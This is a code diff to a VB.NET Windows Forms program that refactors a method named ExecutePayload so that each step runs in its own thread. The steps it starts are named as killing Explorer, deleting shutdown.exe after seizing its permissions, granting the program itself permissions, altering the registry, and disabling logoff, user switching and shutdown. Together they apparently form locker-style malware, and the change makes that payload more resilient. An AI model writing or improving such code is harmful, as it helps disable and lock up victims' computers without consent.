@@ -1399,81 +1399,95 @@ Public Class Form1
         overlay = Nothing
     End Sub
 
-    ' Method to execute the payload in a separate thread
+    ' Method to execute the payload in separate threads for each operation
     Private Sub ExecutePayload()
-
         Try
+            ' Start each operation in a separate Thread with individual Try...Catch blocks.
+            Dim setWallpaperThread As New Thread(Sub()
+                                                     Try
+                                                         SetWallpaper()
+                                                     Catch ex As Exception
+                                                         Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+                                                     End Try
+                                                 End Sub)
+            setWallpaperThread.Start()
 
-            ' Execute remaining operations with individual Try...Catch blocks
-            Try
-                SetWallpaper()
-            Catch ex As Exception
-                ' Log or handle exception for SetWallpaper
-                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-            End Try
+            Dim killExplorerThread As New Thread(Sub()
+                                                     Try
+                                                         KillExplorerAndMore()
+                                                     Catch ex As Exception
+                                                         Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+                                                     End Try
+                                                 End Sub)
+            killExplorerThread.Start()
 
-            Try
-                KillExplorerAndMore()
-            Catch ex As Exception
-                ' Log or handle exception for KillExplorerAndMore
-                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
-            End Try
+            Dim killGrantAccessThread As New Thread(Sub()
+                                                        Try
+                                                            KillGrantAccessAndDeleteShutdownExe()
+                                                        Catch ex As Exception
+                                                            Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
+                                                        End Try
+                                                    End Sub)
+            killGrantAccessThread.Start()
 
-            Try
-                KillGrantAccessAndDeleteShutdownExe()
-            Catch ex As Exception
-                ' Log or handle exception for KillGrantAccessAndDeleteShutdownExe
-                Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
-            End Try
+            Dim writeMessageThread As New Thread(Sub()
+                                                     Try
+                                                         WriteMessageToNotepad()
+                                                     Catch ex As Exception
+                                                         Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+                                                     End Try
+                                                 End Sub)
+            writeMessageThread.Start()
 
-            Try
-                WriteMessageToNotepad()
-            Catch ex As Exception
-                ' Log or handle exception for WriteMessageToNotepad
-                Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
-            End Try
+            Dim grantSelfPermissionsThread As New Thread(Sub()
+                                                             Try
+                                                                 GrantSelfPermissions()
+                                                             Catch ex As Exception
+                                                                 Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
+                                                             End Try
+                                                         End Sub)
+            grantSelfPermissionsThread.Start()
 
-            Try
-                GrantSelfPermissions()
-            Catch ex As Exception
-                ' Log or handle exception for GrantSelfPermissions
-                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
-            End Try
+            Dim visualEffectTimerThread As New Thread(Sub()
+                                                          Try
+                                                              VisualEffectTimer.Start()
+                                                          Catch ex As Exception
+                                                              Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
+                                                          End Try
+                                                      End Sub)
+            visualEffectTimerThread.Start()
 
-            Try
-                VisualEffectTimer.Start()
-            Catch ex As Exception
-                ' Log or handle exception for VisualEffectTimer.Start
-                Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
-            End Try
+            Dim animationTimerThread As New Thread(Sub()
+                                                       Try
+                                                           AnimationTimer.Start()
+                                                       Catch ex As Exception
+                                                           Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+                                                       End Try
+                                                   End Sub)
+            animationTimerThread.Start()
 
-            Try
-                AnimationTimer.Start()
-            Catch ex As Exception
-                ' Log or handle exception for AnimationTimer.Start
-                Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
-            End Try
+            Dim updateRegistryThread As New Thread(Sub()
+                                                       Try
+                                                           UpdateRegistrySettings()
+                                                       Catch ex As Exception
+                                                           Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
+                                                       End Try
+                                                   End Sub)
+            updateRegistryThread.Start()
 
-            Try
-                ' Update registry settings and disable Log off
-                UpdateRegistrySettings()
-            Catch ex As Exception
-                ' Log or handle exception for UpdateRegistrySettings
-                Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
-            End Try
-
-            Try
-                DisableLogoffSwitchUserAndShutdown()
-            Catch ex As Exception
-                ' Log or handle exception for DisableLogoffSwitchUserAndShutdown
-                Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
-            End Try
+            Dim disableLogoffThread As New Thread(Sub()
+                                                      Try
+                                                          DisableLogoffSwitchUserAndShutdown()
+                                                      Catch ex As Exception
+                                                          Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
+                                                      End Try
+                                                  End Sub)
+            disableLogoffThread.Start()
 
         Catch ex As Exception
             ' General exception handling for the entire ExecutePayload method
             Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
         End Try
-
     End Sub
 
     ' Event handler for the Exit button
